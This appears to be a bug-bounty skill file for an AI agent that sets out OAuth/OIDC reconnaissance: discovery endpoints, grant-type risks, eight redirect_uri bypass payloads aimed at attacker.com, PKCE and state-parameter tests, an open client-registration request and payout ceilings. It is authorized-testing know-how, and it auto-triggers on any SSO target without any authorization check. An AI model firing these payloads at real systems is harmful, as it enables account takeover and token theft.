---
context: fork
---

# OAuth Harvester v1.0 — OIDC Discovery + Configuration Audit
**Owner: cyber-operator**
**Trigger:** Auto-detect on any target with SSO, OAuth buttons, or `/oauth/`, `/auth/authorize`, `/connect/authorize`, `/login`, `/sso` paths. OR manual: "oauth harvest", "check oauth", "oidc recon"
**Load sequence:** `oauth-harvester.md` (recon + configuration audit) THEN `oauth-oidc-abuse.md` (attacks)
**Purpose:** Harvest OAuth/OIDC configuration vulnerabilities before executing attacks. Recon-first — don't attempt bypasses without knowing what's present.

---

## AUTO-DETECT CONDITIONS

Trigger oauth-harvester automatically when ANY of these are found during initial recon:
- Login page has "Sign in with Google/GitHub/Apple/Microsoft" buttons
- URL paths contain: `/oauth/`, `/auth/authorize`, `/connect/authorize`, `/sso/`, `/saml/`
- Response headers: `WWW-Authenticate: Bearer`
- JS bundles reference: `oauth`, `oidc`, `access_token`, `id_token`, `authorization_code`
- `/.well-known/openid-configuration` returns 200

---

## STEP 1 — OIDC DISCOVERY DOCUMENT

```
Attempt ALL of these endpoints:
  GET /.well-known/openid-configuration
  GET /.well-known/oauth-authorization-server
  GET /oauth/.well-known/openid-configuration
  GET /{realm}/.well-known/openid-configuration    (Keycloak pattern)
  GET /auth/realms/{realm}/.well-known/openid-configuration
  GET /api/oauth/.well-known/openid-configuration

200 response = discovery doc found. Extract:
  → authorization_endpoint
  → token_endpoint
  → userinfo_endpoint
  → jwks_uri
  → registration_endpoint (if present = dynamic client reg — HIGH VALUE)
  → grant_types_supported []
  → response_types_supported []
  → scopes_supported []
  → claims_supported []
  → id_token_signing_alg_values_supported []
```

**What to flag immediately:**
- `registration_endpoint` present → Dynamic Client Registration attack possible (HIGH)
- `id_token_signing_alg_values_supported` includes `none` → alg:none downgrade possible (CRITICAL)
- `id_token_signing_alg_values_supported` includes `HS256` only (no RS256) → HMAC secret brute-force possible

---

## STEP 2 — INSECURE GRANT TYPE FLAGS

From the discovery doc `grant_types_supported` array:

| Grant Type | Risk | Attack |
|-----------|------|--------|
| `implicit` | HIGH | Token exposed in URL fragment — intercept via Referer header |
| `password` | HIGH | Direct credential submission — brute-force, no MFA protection |
| `client_credentials` | MEDIUM | Check if client secret leaked in JS/source |
| `device_code` | MEDIUM | Device auth code phishing possible |
| `authorization_code` | LOW (baseline) | Expected — check PKCE enforcement |
| `urn:ietf:params:oauth:grant-type:token-exchange` | MEDIUM | Token impersonation possible |

**Flag any program using `implicit` or `password` grants — these are deprecated in OAuth 2.1.**

```
Test implicit flow manually:
  GET {authorization_endpoint}?response_type=token&client_id={any}&redirect_uri={any}&scope=openid
  → 200 with access_token in URL fragment = implicit flow active
  → access_token in URL = logged in Referer headers, browser history, server logs
```

---

## STEP 3 — REDIRECT_URI ENUMERATION + BYPASS TEST

### 3a. Extract Legitimate redirect_uris
```
Sources:
  - JS bundles (search for redirect_uri=)
  - Authorization requests in Burp history
  - Error messages from invalid redirect_uri (may disclose valid ones)
  - Registration endpoint (if open)
```

### 3b. Bypass Test Matrix

For each discovered redirect_uri, test these bypass patterns:

```
Base:    redirect_uri=https://app.target.com/callback

Pattern 1 — Path traversal:
  redirect_uri=https://app.target.com/callback/../attacker

Pattern 2 — Subdomain wildcard abuse (if *.target.com allowed):
  redirect_uri=https://evil.target.com/callback

Pattern 3 — Fragment bypass:
  redirect_uri=https://app.target.com/callback#https://attacker.com

Pattern 4 — Parameter pollution:
  redirect_uri=https://app.target.com/callback&redirect_uri=https://attacker.com

Pattern 5 — URL encoding:
  redirect_uri=https://app.target.com%2Fcallback%2F..%2F..%2Fattacker.com

Pattern 6 — Port injection:
  redirect_uri=https://app.target.com:443.attacker.com/callback

Pattern 7 — Embedded credentials:
  redirect_uri=https://attacker.com@app.target.com/callback

Pattern 8 — Open redirect chain (if target has open redirect):
  redirect_uri=https://app.target.com/redirect?url=https://attacker.com
```

**Success condition:** Authorization code OR access_token delivered to attacker-controlled redirect_uri = ATO-level finding.

---

## STEP 4 — PKCE DOWNGRADE TEST

PKCE (Proof Key for Code Exchange) prevents authorization code interception attacks.

```
Normal PKCE request:
  GET /authorize?...&code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256

PKCE downgrade test:
  Request 1: GET /authorize?...  (no code_challenge at all)
  → Does server reject? NO = PKCE not enforced

  Request 2: GET /authorize?...&code_challenge_method=plain
  → Does server accept plain method? YES = weak PKCE (guessable verifier)

Token exchange without verifier:
  POST /token with: code={captured_code} (no code_verifier)
  → Returns token? YES = PKCE bypass confirmed
```

**PKCE not enforced + authorization code interception = Critical (ATO).**

---

## STEP 5 — STATE PARAMETER VALIDATION

The `state` parameter prevents CSRF on the OAuth callback.

```
Test 1 — Missing state:
  GET {authorization_endpoint}?...  (omit state param entirely)
  → Server proceeds? YES = state not required

Test 2 — Empty state:
  GET {authorization_endpoint}?...&state=
  → Server proceeds? YES = empty state accepted

Test 3 — State not validated on callback:
  Complete OAuth flow with state=CSRF_TEST
  Submit callback to victim session with state=ATTACKER_STATE
  → If callback accepted = state not bound to session

Test 4 — Replayable state:
  Complete flow → capture callback URL → replay in new session
  → If accepted = state not invalidated after use
```

---

## STEP 6 — DYNAMIC CLIENT REGISTRATION (if endpoint exists)

```
If registration_endpoint found in discovery doc:

POST {registration_endpoint}
Content-Type: application/json
{
  "client_name": "test-client",
  "redirect_uris": ["https://attacker.com/callback"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "scope": "openid profile email"
}

SUCCESS (201 Created with client_id/client_secret):
  → Open Dynamic Client Registration = CRITICAL
  → Attacker registers client → phishes users → receives their auth codes
  → No server-side trust — any client accepted

RESTRICTED (401/403 requires initial access token):
  → Check if initial_access_token is leaked in JS/docs
```

---

## OUTPUT SCHEMA (feeds attack routing)

Write to a working file, e.g. `oauth-harvest-{target}.json`:

```json
{
  "target": "target.com",
  "discovery_doc_found": true,
  "discovery_url": "https://target.com/.well-known/openid-configuration",
  "insecure_grants": ["implicit", "password"],
  "pkce_enforced": false,
  "pkce_downgrade_confirmed": false,
  "state_validated": true,
  "redirect_uri_bypass": {
    "tested": true,
    "bypass_found": "Pattern 3 — fragment bypass",
    "bypass_payload": "https://app.target.com/callback#https://attacker.com"
  },
  "dynamic_client_registration": "open",
  "alg_none_supported": false,
  "recommended_attacks": [
    "implicit_flow_token_intercept",
    "redirect_uri_bypass_via_fragment",
    "pkce_not_enforced_code_interception"
  ],
  "findings_to_load": ["oauth-oidc-abuse.md section 2, section 4"]
}
```

---

## ATTACK ROUTING (after harvest)

| Finding from Harvest | Load From |
|---------------------|-----------|
| Implicit flow active | oauth-oidc-abuse.md → Implicit Flow section |
| redirect_uri bypass found | oauth-oidc-abuse.md → redirect_uri section |
| PKCE not enforced | oauth-oidc-abuse.md → PKCE section |
| State not validated | oauth-oidc-abuse.md → CSRF section |
| Dynamic client reg open | oauth-oidc-abuse.md → DCR section |
| alg:none supported | oauth-oidc-abuse.md → JWT alg section (CRITICAL) |

---

## EV CEILING REFERENCE

| Finding | Severity | Typical Ceiling |
|---------|---------|----------------|
| ATO via redirect_uri bypass | Critical | $5K–$50K |
| PKCE not enforced + code interception | High-Critical | $2.5K–$25K |
| Open Dynamic Client Registration | High | $2.5K–$15K |
| Implicit flow (token in URL) | Medium-High | $500–$5K |
| CSRF via missing state | Medium | $500–$2.5K |
| alg:none accepted | Critical | $5K–$50K |

---

*OAuth Harvester v1.0 — OAuth/OIDC recon + configuration audit*
